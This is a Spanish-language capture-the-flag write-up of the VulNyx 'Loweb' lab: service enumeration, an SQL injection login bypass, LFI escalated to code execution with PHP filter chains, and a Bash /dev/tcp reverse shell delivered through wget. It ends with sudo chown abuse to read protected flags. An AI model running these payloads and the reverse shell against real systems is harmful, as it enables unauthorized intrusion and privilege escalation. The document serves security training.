# VulNyx — Loweb | Writeup completo

<img width="556" height="308" alt="image" src="https://github.com/user-attachments/assets/e6088577-bf9f-4889-bf6d-ee74b0d0087b" />


| Información | Detalle |
|---|---|
| **Laboratorio** | VulNyx — Loweb |
| **Objetivo** | Obtener acceso inicial, identificar vulnerabilidades y recuperar las flags de usuario y administrador. |
| **Máquina atacante** | Kali Linux (`192.168.0.13`) |
| **Máquina objetivo** | Loweb (`192.168.0.14`) |
| **Entorno** | Laboratorio local autorizado (`192.168.0.0/24`) |
| **Acceso inicial** | `www-data` |
| **Usuario comprometido** | `r3dh4ck` |
| **Vulnerabilidades explotadas** | SQL Injection, LFI, RCE y configuración insegura de `sudo` (`chown`) |
| **Resultado** | Acceso como `www-data`, cambio a `r3dh4ck` y recuperación de las flags `user.txt` y `r00t.txt`. |


## Índice

1. [Reconocimiento de red](#1-reconocimiento-de-red)
2. [Enumeración de servicios](#2-enumeración-de-servicios)
3. [Enumeración web](#3-enumeración-web)
4. [Bypass de autenticación mediante SQL Injection](#4-bypass-de-autenticación-mediante-sql-injection)
5. [LFI y ejecución de código mediante PHP Filter Chain](#5-lfi-y-ejecución-de-código-mediante-php-filter-chain)
6. [Obtención de reverse shell](#6-obtención-de-reverse-shell)
7. [Enumeración local y credenciales](#7-enumeración-local-y-credenciales)
8. [Flag de usuario](#8-flag-de-usuario)
9. [Flag de root mediante abuso de chown](#9-flag-de-root-mediante-abuso-de-chown)
10. [Hallazgos y remediaciones](#10-hallazgos-y-remediaciones)
11. [Conclusión](#11-conclusión)

---

## 1. Reconocimiento de red

Comencé comprobando la configuración de red de Kali y la ruta hacia la red del laboratorio:

```bash
ip -br addr
ip route
```

La interfaz `eth0` tenía asignada la dirección `192.168.0.13/24`, con ruta a la subred `192.168.0.0/24`.

<img width="528" height="87" alt="01-red-kali" src="https://github.com/user-attachments/assets/c457921b-d022-43fa-87dc-01208e862a17" />

*Dirección IP e interfaz de Kali*

<img width="528" height="84" alt="02-gateway" src="https://github.com/user-attachments/assets/40b2b65f-6c15-4312-9a03-4780ff44e5c7" />


*Tabla de rutas y puerta de enlace*


Para descubrir los equipos activos realicé un barrido ARP con Nmap:

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

Posteriormente extraje las direcciones identificadas del archivo `.gnmap`:

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

Entre los hosts activos apareció `192.168.0.14`, identificado por Nmap con una dirección MAC de Oracle VirtualBox, coherente con la VM del laboratorio.

<img width="530" height="615" alt="image" src="https://github.com/user-attachments/assets/920ae9f2-a505-4255-974d-630e141996d7" />

*Descubrimiento ARP de hosts activos*

<img width="509" height="198" alt="04-hosts-activos" src="https://github.com/user-attachments/assets/32a9c01d-7929-4891-a06d-8407306b3aed" />

*Listado de direcciones IP activas*


## 2. Enumeración de servicios

### 2.1 Escaneo completo de puertos TCP

Realicé un escaneo de los 65.535 puertos TCP:

```bash
sudo nmap -sS -p- 192.168.0.14 -oA port-scanning-full-tcp-192.168.0.14
```

El resultado mostró dos puertos abiertos:

```text
22/tcp open ssh
80/tcp open http
```

<img width="532" height="198" alt="05-puertos-tcp" src="https://github.com/user-attachments/assets/d3a0a1ba-fa06-407a-883d-778b186d42aa" />

*Escaneo completo de puertos TCP*


### 2.2 Detección de versiones

```bash
sudo nmap -sV -p 22,80 192.168.0.14 -oA service-detection-inicial-192.168.0.14
```

| Puerto | Servicio | Versión detectada |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian 2+deb12u5 |
| 80/tcp | HTTP | Apache httpd 2.4.62 (Debian) |

<img width="529" height="260" alt="06-servicios" src="https://github.com/user-attachments/assets/874e5947-f7c5-42c3-80d9-d4296cff60a6" />

*Identificación de servicios y versiones*


También realicé detección de sistema operativo:

```bash
sudo nmap -O 192.168.0.14 -oA os-fingerprint-192.168.0.14
```

Nmap estimó un sistema Linux con kernel de la familia 4.x–5.x. Esta identificación es aproximada y no debe interpretarse como una versión exacta.

<img width="530" height="292" alt="07-sistema-operativo" src="https://github.com/user-attachments/assets/519588df-b67c-4e8e-a3dc-4103030ece7f" />

*Detección aproximada del sistema operativo*


### 2.3 Enumeración de SSH

Inspeccioné los algoritmos criptográficos anunciados por el servicio:

```bash
nmap -p 22 --script ssh2-enum-algos 192.168.0.14
```

<img width="486" height="757" alt="08-algoritmos-ssh" src="https://github.com/user-attachments/assets/52f8965c-de97-4ea8-b351-c715696ee8ce" />

*Enumeración de algoritmos SSH*


También comprobé los métodos de autenticación anunciados para `root`:

```bash
nmap -p 22 \
  --script ssh-auth-methods \
  --script-args='ssh.user=root' \
  192.168.0.14
```

El servidor anunciaba autenticación por clave pública y contraseña. No obtuve acceso por SSH en esta etapa, por lo que continué con el servicio HTTP.

<img width="487" height="262" alt="09-autenticacion-ssh" src="https://github.com/user-attachments/assets/acc18db0-9ef9-4da7-83b0-f3ec39e36b09" />

*Métodos de autenticación SSH*


## 3. Enumeración web

### 3.1 Respuesta HTTP inicial

Consulté las cabeceras del servidor:

```bash
curl -I http://192.168.0.14 | tee http-headers-inicial-192.168.0.14.txt
```

La respuesta fue `HTTP/1.1 200 OK`, con Apache 2.4.62 sobre Debian.

<img width="533" height="329" alt="10-cabeceras-http" src="https://github.com/user-attachments/assets/ed1869a6-7305-44fe-b78a-8439c3a3a4a7" />

*Cabeceras HTTP del servidor*


Al abrir `http://192.168.0.14/` encontré la página predeterminada de Apache2 Debian, que no revelaba directamente la aplicación objetivo.

<img width="951" height="723" alt="11-apache-default" src="https://github.com/user-attachments/assets/d480c855-4d0d-4da3-9bab-b8822a34934a" />

*Página predeterminada de Apache*


También comprobé si existía un archivo `robots.txt`:

```bash
curl -i http://192.168.0.14/robots.txt | tee http-robots-inicial-192.168.0.14.txt
```

El servidor respondió `404 Not Found`; no se obtuvo información adicional por esa vía.

<img width="536" height="443" alt="12-robots" src="https://github.com/user-attachments/assets/c1b5160e-44ef-4b9c-b5cc-a70003ab7d50" />

*Comprobación de robots.txt*


### 3.2 Descubrimiento de directorios

Ejecuté Gobuster contra la raíz web:

```bash
gobuster dir \
  -u http://192.168.0.14 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10 \
  -o gobuster-common-192.168.0.14.txt
```

Entre los resultados destacó `/library/`, con redirección `301`. Las entradas `.htaccess` y `.htpasswd` devolvieron `403`, lo que no implica que su contenido fuera accesible.

<img width="533" height="435" alt="13-gobuster-raiz" src="https://github.com/user-attachments/assets/1b7f7695-f10b-4880-a4d7-bf9bdcbc7e9b" />

*Descubrimiento de /library/ con Gobuster*


### 3.3 Inspección de `/library/`

Consulté su HTML:

```bash
curl -i http://192.168.0.14/library/
```

La página se titulaba *Steam inspired game card hover effect* y presentaba tarjetas visuales. También incluía recursos como `style.css` y `script.js`.

<img width="535" height="730" alt="14-library-curl" src="https://github.com/user-attachments/assets/aa1febf3-59fa-44f5-a08c-1d0d1d6175e4" />

*Inspección HTTP del contenido de /library/*

<img width="1079" height="690" alt="15-library-visual" src="https://github.com/user-attachments/assets/36f06185-a605-42c7-a3d6-bd78961836e6" />

*Vista de la aplicación /library/*


Revisé el JavaScript expuesto:

```bash
curl -s http://192.168.0.14/library/script.js
```

El archivo contenía créditos de imágenes; no surgió de esta revisión una credencial útil para el acceso.

<img width="531" height="168" alt="16-script-js" src="https://github.com/user-attachments/assets/ef81aed4-5377-4176-a677-966fd77ab0ca" />

*Inspección del archivo JavaScript*


Amplié la enumeración sobre `/library/`, incorporando extensiones:

```bash
gobuster dir \
  -u http://192.168.0.14/library/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 20 \
  -x php,html,txt,js,bak \
  -o gobuster-library.txt
```

Se identificaron, entre otras rutas:

```text
/library/admin/     (301)
/library/login/     (301)
/library/index.html (200)
/library/script.js  (200)
```

<img width="545" height="753" alt="17-gobuster-library" src="https://github.com/user-attachments/assets/8338fcbb-7968-4396-b5dc-d1c7cd7ad6aa" />

*Enumeración de directorios y archivos en /library/*


### 3.4 Identificación del panel de login

Consulté el directorio administrativo:

```bash
curl -iL http://192.168.0.14/library/admin/
```

La aplicación respondió inicialmente con una redirección `302` hacia `/library/login/index.php`, estableciendo una cookie de sesión PHP. Seguir la redirección permitió visualizar el formulario de autenticación.

<img width="536" height="659" alt="18-redireccion-admin" src="https://github.com/user-attachments/assets/a3c7a4fd-9795-43b9-8319-9a5687ce0725" />

*Redirección del panel administrativo hacia el login*

<img width="642" height="613" alt="19-login" src="https://github.com/user-attachments/assets/c16f3c84-6c68-467f-b486-b198cc239474" />

*Formulario de autenticación*


## 4. Bypass de autenticación mediante SQL Injection

En el formulario de login probé una carga de inyección SQL en los campos de autenticación:

```sql
' OR 1=1 -- -
```

La expresión introduce una condición siempre verdadera (`1=1`) y utiliza el comentario SQL para neutralizar el resto de la consulta cuando el contexto de la aplicación lo permite. En este laboratorio, la prueba permitió superar el formulario sin disponer de credenciales válidas.

<img width="407" height="238" alt="20-sqli" src="https://github.com/user-attachments/assets/9348dc4d-0a37-4e7f-8985-d2d5eacc39c8" />

*Prueba de SQL Injection en el formulario de login*


Tras enviar el formulario, conseguí acceder al panel administrativo de la aplicación.

<img width="942" height="878" alt="21-admin" src="https://github.com/user-attachments/assets/d25448a6-2f81-4f17-a812-3d2bd41ec689" />

*Acceso al dashboard administrativo*


**Hallazgo:** bypass de autenticación mediante SQL Injection. No se extrajo ni verificó en esta etapa la consulta SQL exacta del backend; la conclusión se apoya en el comportamiento observado.

## 5. LFI y ejecución de código mediante PHP Filter Chain

### 5.1 Identificación del parámetro `lang`

Dentro del panel administrativo inspeccioné el código fuente y observé enlaces de selección de idioma:

```html
<a href="index.php?lang=es.php">es</a>
<a href="index.php?lang=en.php">en</a>
```

El parámetro `lang` parecía controlar qué archivo PHP se cargaba. Lo investigué como posible punto de inclusión local de archivos (*Local File Inclusion*, LFI).

<img width="942" height="878" alt="21-admin" src="https://github.com/user-attachments/assets/610a2abd-d0dc-41c1-a7a2-27acf4978c79" />

*Identificación del parámetro lang en el código HTML*


### 5.2 Lectura de código PHP mediante filtros

Probé el wrapper de PHP `php://filter` para solicitar una representación Base64 de un archivo PHP:

```text
index.php?lang=php://filter/convert.base64-encode/resource=index.php
```

La respuesta permitió obtener contenido codificado en Base64, lo que evidenció que el parámetro aceptaba una ruta manipulable y que era posible utilizar filtros de PHP para leer contenido del servidor.

<img width="1079" height="849" alt="23-php-filter" src="https://github.com/user-attachments/assets/7effba76-46df-4272-a39a-6b986fa6c7d8" />

*Comprobación de lectura/codificación Base64 mediante php://filter*


### 5.3 De lectura de archivos a ejecución de código

A continuación utilicé el generador `php_filter_chain_generator.py` de Synacktiv para construir cadenas `php://filter` capaces de introducir contenido PHP en el flujo de inclusión.

Primero realicé pruebas sencillas para confirmar ejecución, por ejemplo:

```php
<?=print(12345);?>
```

Y después una prueba de ejecución de comandos:

```php
<?=`id`?>
```

La respuesta de `id` confirmó ejecución como el usuario del servicio web:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Hallazgo:** la inclusión de archivos controlada por `lang`, combinada con el procesamiento de filtros de PHP, permitió pasar de una LFI a ejecución remota de código (*RCE*) en el contexto de `www-data`.

### 5.4 Limitación por longitud de la petición

Al intentar ejecutar cargas más largas, encontré problemas por la longitud de las cadenas generadas. El servidor rechazaba algunas solicitudes extensas, compatibles con el límite de longitud de la línea de petición HTTP de Apache (por ejemplo, errores `414 URI Too Long`).

<img width="227" height="37" alt="24-limite-http" src="https://github.com/user-attachments/assets/8fd0262d-d75a-4b01-85e7-2e2b564661e7" />

*Verificación del límite de longitud de las peticiones*


Para evitar ese problema opté por un enfoque en dos etapas: colocar un script corto en el servidor y generar una cadena PHP Filter mínima que únicamente lo ejecutara.

## 6. Obtención de reverse shell

### 6.1 Preparación del script

En Kali preparé un archivo llamado `r` con el comando de conexión inversa:

```bash
bash -i >& /dev/tcp/192.168.0.13/443 0>&1
```

Este comando utiliza una funcionalidad de Bash para conectar la entrada y salida de una shell interactiva con un socket TCP hacia Kali. El destino corresponde exclusivamente a la IP del laboratorio.

Levanté un servidor HTTP para entregar el archivo:

```bash
python3 -m http.server 8000
```

Las pruebas confirmaron que el objetivo podía solicitar el recurso `/r` desde `192.168.0.13:8000` utilizando `wget`.

<img width="526" height="104" alt="26-servidor-http" src="https://github.com/user-attachments/assets/13ba5e02-1e44-45ee-9821-b0342a7c6be7" />

*Servidor HTTP Python y peticiones GET /r desde Loweb*


La descarga dejó el archivo `r` en el directorio de trabajo de la aplicación:

```text
/var/www/html/library/admin/r
```

En el objetivo se verificó que `wget` y Bash estaban disponibles, mientras que `curl` y `nc` no se encontraban en el PATH utilizado durante las pruebas.

### 6.2 Generación de la cadena corta

En lugar de insertar la reverse shell completa dentro de la cadena PHP Filter, generé una carga que ejecutaba el archivo ya descargado:

```bash
python3 php_filter_chain_generator.py \
  --chain '<?=`bash r`?>' \
  | grep '^php://filter/' > ejecutar-r.txt
```

Verifiqué el tamaño del archivo:

```bash
wc -c ejecutar-r.txt
```

El resultado registrado fue de **2916 bytes**, suficientemente pequeño para esta prueba.

<img width="483" height="57" alt="25-cadena-shell" src="https://github.com/user-attachments/assets/88b654a8-9b3e-4336-8276-4922f7c70fdb" />

*Generación de ejecutar-r.txt con la cadena de ejecución*


### 6.3 Recepción de la conexión

En Kali inicié un listener:

```bash
nc -lvnp 443
```

Envié el contenido de `ejecutar-r.txt` mediante el parámetro `lang` del panel autenticado. El servidor ejecutó `bash r` y estableció la conexión inversa hacia Kali.

Una vez recibida la shell, confirmé el contexto de ejecución:

```bash
whoami
id
hostname
pwd
```

Resultados relevantes:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
loweb
/var/www/html/library/admin
```

<img width="529" height="312" alt="27-shell" src="https://github.com/user-attachments/assets/71c269d0-4a63-4ad3-931a-64baa9252a9b" />

*Reverse shell obtenida como www-data*


> **Nota de laboratorio:** durante las pruebas se perdió una sesión al interactuar con `su` y algunos procesos/peticiones quedaron sin respuesta. Tras reiniciar la VM se recuperó el acceso al panel y se repitió la explotación. Esta incidencia no constituyó una vulnerabilidad adicional demostrada.

## 7. Enumeración local y credenciales

### 7.1 Localización de la flag de usuario

Desde la shell de `www-data` busqué la flag:

```bash
find / -type f -name 'user.txt' 2>/dev/null
```

La búsqueda devolvió:

```text
/home/r3dh4ck/user.txt
```

Sin embargo, la lectura directa falló:

```bash
cat /home/r3dh4ck/user.txt
# Permission denied
```

<img width="401" height="155" alt="28-user-no-access" src="https://github.com/user-attachments/assets/7168a7d4-004e-47d4-8f0b-4e097afd6b49" />

*Localización de user.txt y denegación de acceso desde www-data*


### 7.2 Búsqueda de credenciales

Para identificar posibles secretos almacenados en archivos accesibles realicé una búsqueda de la palabra `password`:

```bash
grep -RinI 'password' / 2>/dev/null
```

El resultado señaló el archivo `/opt/monitor.sh`, que contenía una variable `SECRET_PASS` con una contraseña en texto claro y una instrucción que escribía su valor en un archivo de log:

```bash
SECRET_PASS="<contraseña-en-texto-claro>"
echo "Password: $SECRET_PASS" >> "$LOGFILE"
```

La captura muestra la contraseña completa; aquí se omite su reproducción para evitar propagar innecesariamente un secreto, incluso en un laboratorio.

<img width="533" height="81" alt="image" src="https://github.com/user-attachments/assets/57486ace-37c7-40c4-9de8-2d801374642d" />

*Búsqueda de contraseñas y hallazgo de SECRET_PASS en /opt/monitor.sh*


### 7.3 Cambio al usuario `r3dh4ck`

Probé la contraseña descubierta para cambiar de usuario:

```bash
su r3dh4ck
whoami
```

El comando `whoami` confirmó el acceso:

```text
r3dh4ck
```

<img width="470" height="82" alt="image" src="https://github.com/user-attachments/assets/046a14d1-8369-40b4-b131-aae222813c13" />

*Cambio de www-data a r3dh4ck mediante contraseña encontrada*


**Hallazgo:** exposición de credenciales en un script local y reutilización de la contraseña para una cuenta del sistema.

## 8. Flag de usuario

Aunque ya estaba autenticado como `r3dh4ck`, la flag seguía sin poder leerse:

```bash
cat /home/r3dh4ck/user.txt
# Permission denied
```

La enumeración de permisos mostró:

```text
-r-------- 1 775 r3dh4ck ... user.txt
```

Y `id` confirmó:

```text
uid=1000(r3dh4ck) gid=1000(r3dh4ck) groups=1000(r3dh4ck)
```

El propietario real del archivo era el **UID 775**, mientras que la sesión correspondía al **UID 1000**. Con permisos `400`, solo el propietario podía leerlo.

### 8.1 Enumeración de privilegios sudo

Ejecuté:

```bash
sudo -l
```

El resultado reveló:

```text
User r3dh4ck may run the following commands on loweb:
    (ALL) NOPASSWD: /usr/bin/chown
```

<img width="528" height="377" alt="31-sudo-chown" src="https://github.com/user-attachments/assets/a2f8b98a-7929-4c18-a793-adf956337e4c" />

*Permisos de user.txt y configuración NOPASSWD para chown*


### 8.2 Cambio de propietario y lectura

Aproveché el permiso de ejecutar `chown` como root para asignar la propiedad de la flag al usuario actual:

```bash
sudo /usr/bin/chown r3dh4ck /home/r3dh4ck/user.txt
```

<img width="439" height="21" alt="32-chown-user" src="https://github.com/user-attachments/assets/24a10323-bef3-49b5-b7b4-2450138ba809" />

*Cambio de propietario de user.txt mediante sudo chown*


Después comprobé que el archivo podía leerse:

```bash
cat /home/r3dh4ck/user.txt
```

**Resultado:** flag `user.txt` obtenida correctamente.

<img width="463" height="84" alt="image" src="https://github.com/user-attachments/assets/94f5d6ae-c04f-4bea-9ea0-bf61183d50d5" />

*Lectura exitosa de la flag de usuario*


## 9. Flag de root mediante abuso de chown

El permiso `NOPASSWD` sobre `/usr/bin/chown` no se limitaba a la flag de usuario: permitía ejecutar el binario con privilegios de root sobre otras rutas del sistema.

### 9.1 Acceso al directorio `/root`

Desde `r3dh4ck`, el intento inicial de acceder a `/root` fue rechazado:

```bash
cd /root
# Permission denied
```

Modifiqué el propietario del directorio:

```bash
sudo /usr/bin/chown r3dh4ck /root
```

Esto permitió entrar en el directorio conservando sus permisos de acceso para el propietario:

```bash
cd /root
ls
```

La flag del laboratorio se llamaba **`r00t.txt`** (con dos ceros), no `root.txt`:

```text
r00t.txt
```

### 9.2 Cambio de propietario de la flag

Ejecuté:

```bash
sudo /usr/bin/chown r3dh4ck /root/r00t.txt
cat /root/r00t.txt
```

**Resultado:** lectura exitosa de `r00t.txt`.

<img width="394" height="737" alt="image" src="https://github.com/user-attachments/assets/09371377-8ce0-4aac-b951-c7a0a66f896a" />

*Acceso a /root y lectura de r00t.txt mediante abuso de chown*


> **Alcance del resultado:** esta secuencia demuestra acceso a una flag protegida mediante cambios de propietario ejecutados con privilegios elevados. No debe confundirse automáticamente con la obtención de una shell interactiva con UID 0. Para completar el objetivo del laboratorio no fue necesario modificar `/etc/passwd`.


### Cadena de ataque observada

```text
Reconocimiento de red
    ↓
Enumeración HTTP → /library/ → /library/login/ y /library/admin/
    ↓
SQL Injection → bypass de autenticación
    ↓
Parámetro lang → LFI → PHP Filter Chain → RCE
    ↓
Reverse shell como www-data
    ↓
Credencial en /opt/monitor.sh → su r3dh4ck
    ↓
sudo -l → NOPASSWD: /usr/bin/chown
    ↓
Cambio de propietario de user.txt y r00t.txt
    ↓
Lectura de ambas flags
```

## 11. Conclusión

La explotación de Loweb mostró cómo una cadena de debilidades aparentemente independientes puede comprometer un servidor: un formulario vulnerable permitió acceder al panel, una inclusión de archivos permitió ejecutar código PHP, un secreto almacenado en texto claro facilitó el cambio de usuario y una regla demasiado permisiva de `sudo` permitió acceder a archivos protegidos.

El principal aprendizaje fue **validar cada avance con evidencia**: identificar servicios, confirmar el bypass, comprobar ejecución de comandos, verificar el usuario de la reverse shell y revisar los permisos reales antes de intentar acceder a las flags.

La fase final no requirió alterar cuentas del sistema ni borrar contraseñas: bastó con demostrar el impacto del permiso inseguro de `chown` en el entorno de laboratorio.

---

*Writeup realizado sobre una máquina de práctica en un entorno controlado y autorizado. Las técnicas y comandos se documentan con fines educativos.*
